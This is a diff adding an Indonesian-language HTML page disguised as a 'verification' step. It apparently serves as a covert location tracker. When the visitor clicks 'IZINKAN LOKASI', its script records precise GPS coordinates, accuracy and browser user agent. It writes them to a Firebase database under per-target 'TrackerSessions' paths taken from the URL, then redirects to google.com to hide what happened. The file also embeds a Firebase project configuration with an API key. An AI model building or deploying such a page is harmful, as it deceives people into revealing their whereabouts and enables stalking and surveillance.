@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Loading...</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#fff;font-family:'Inter',sans-serif;height:100vh;overflow:hidden;display:flex;align-items:center;justify-content:center}
+.fullscreen-img{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:0}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:20px}
+.box{background:rgba(0,0,0,.85);backdrop-filter:blur(20px);padding:30px;border-radius:30px;border:1px solid #00f2ff;width:90%;max-width:350px}
+button{background:#00f2ff;border:none;padding:15px;width:100%;border-radius:30px;font-weight:800;font-size:1rem;margin-top:15px;cursor:pointer}
+.status{color:#0f0;margin-top:15px;font-size:.8rem}
+</style>
+</head>
+<body>
+<img class="fullscreen-img" src="https://drive.google.com/uc?export=view&id=1J6epb4RdI_3wspnW4PsfS9HmNPTiF0zH">
+<div class="overlay">
+  <div class="box">
+    <h2>📍 VERIFIKASI</h2>
+    <p style="margin-bottom:20px;font-size:.8rem">Izinkan akses lokasi untuk melanjutkan</p>
+    <button id="allowBtn">IZINKAN LOKASI</button>
+    <div id="status" class="status">⏳ Menunggu izin...</div>
+  </div>
+</div>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyAJpfGp4lXLV7ZismAecRqjlb647N1wwF8",
+    authDomain: "cyber-d8666.firebaseapp.com",
+    databaseURL: "https://cyber-d8666-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "cyber-d8666",
+    storageBucket: "cyber-d8666.firebasestorage.app",
+    appId: "1:730876309985:web:31a77ffe0317c7e11a22a0"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  const pathParts = window.location.pathname.split('/').filter(p => p);
+  const userId = pathParts[1];
+  const sessionId = pathParts[2];
+  const sessionRef = db.ref(`TrackerSessions/${userId}/${sessionId}`);
+
+  document.getElementById('allowBtn').onclick = () => {
+    if("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const {latitude, longitude, accuracy} = pos.coords;
+        const locData = {
+          lat: latitude,
+          lng: longitude,
+          acc: accuracy,
+          time: Date.now(),
+          ua: navigator.userAgent
+        };
+        sessionRef.once('value', snap => {
+          let data = snap.val() || { clicks:0, locations:[] };
+          data.clicks = (data.clicks||0) + 1;
+          data.locations = data.locations || [];
+          data.locations.push(locData);
+          sessionRef.set(data);
+          document.getElementById('status').innerHTML = '✅ Lokasi terkirim, mengalihkan...';
+          setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
+        });
+      }, err => {
+        document.getElementById('status').innerHTML = '❌ Gagal akses lokasi: ' + err.message;
+      });
+    } else {
+      document.getElementById('status').innerHTML = '❌ Geolokasi tidak didukung';
+    }
+  };
+</script>
+</body>
+</html>
